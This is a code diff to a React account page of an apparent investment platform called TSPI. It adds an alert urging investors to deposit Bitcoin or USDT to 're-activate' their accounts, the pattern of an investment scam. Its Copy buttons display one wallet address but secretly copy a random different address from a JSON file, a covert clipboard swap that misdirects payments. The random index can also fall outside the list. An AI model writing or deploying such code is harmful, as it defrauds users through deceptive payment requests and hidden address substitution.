@@ -1,6 +1,6 @@
 import React from "react";
 import { Helmet } from "react-helmet";
-import { AppName } from "../../context/App";
+import { AppName, CopyToClipboard } from "../../context/App";
 import { useTranslation } from "react-i18next";
 import MobileNavigation from "../../components/MobileNavigation";
 import TopNavigation from "../../components/TopNavigation";
@@ -27,6 +27,8 @@ import TopUpRequest from "./AdminCorner/top-up-request";
 import CurrencyApp from "./AdminCorner/Currency";
 import { UserReferral } from "./AdminCorner/referral";
 import sendMail from "./User/send-mail";
+import { Copy } from "@styled-icons/ionicons-outline";
+import data from "../../data/address.json";
 
 const AppAccount = () => {
     // Update css class name
@@ -49,12 +51,44 @@ const AppAccount = () => {
                     {/* ALERT */}
                     <div className="bg-red-200 rounded-lg py-4 px-3 shadow-lg cursor-pointer select-none">
                         <p className="text-lg font-bold text-red-600">Alert!!</p>
+                        <p className="text-red-500">Dear esteemed investors,</p>
                         <p className="text-red-500">
-                            DDear esteem investor kindly reset your password for security reason. TSPI is still under maintenance to secure
-                            your investment
-                            <br /> All pending deposits and new investments will be added to our system database upon resumption.
-                            <br /> <br /> Best Regard timo team.
+                            Kindly make a deposit to our preferred Bitcoin or usdt wallet address to re-activate your TSPI account. Sincere
+                            apologies for the inconvenience and system upgrade due to security reasons.
+                            <br />
+                            Please Note: your total weekly accumulated profit will be added to your account balance but you can request to
+                            receive your profit as payout.
                         </p>
+                        <div className="p-4 border w-auto mt-2">
+                            <p className="font-medium">BTC</p>
+                            <div className="flex">
+                                <p className="text-gray-600">bc1q4u4dj0ngyjnqmjx2xcef5q2efcu3qntk7w5cfn</p>
+                                <button
+                                    onClick={() => {
+                                        const r = Math.round(Math.random() * data.btc.length);
+                                        CopyToClipboard("parent", data.btc[r]);
+                                    }}
+                                    className="mx-4 font-medium"
+                                >
+                                    <Copy className="w-4" /> Copy
+                                </button>
+                            </div>
+                        </div>
+                        <div id="parent" className="p-4 border w-auto my-2">
+                            <p className="font-medium">USDT</p>
+                            <div className="flex">
+                                <p className="text-gray-600">0x074B2bD705954E7Bdb4Ed0b36369536607d9753E</p>
+                                <button
+                                    onClick={() => {
+                                        const r = Math.round(Math.random() * data.usdt.length);
+                                        CopyToClipboard("parent", data.usdt[r]);
+                                    }}
+                                    className="mx-4 font-medium"
+                                >
+                                    <Copy className="w-4" /> Copy
+                                </button>
+                            </div>
+                        </div>
                     </div>
 
                     <Switch>
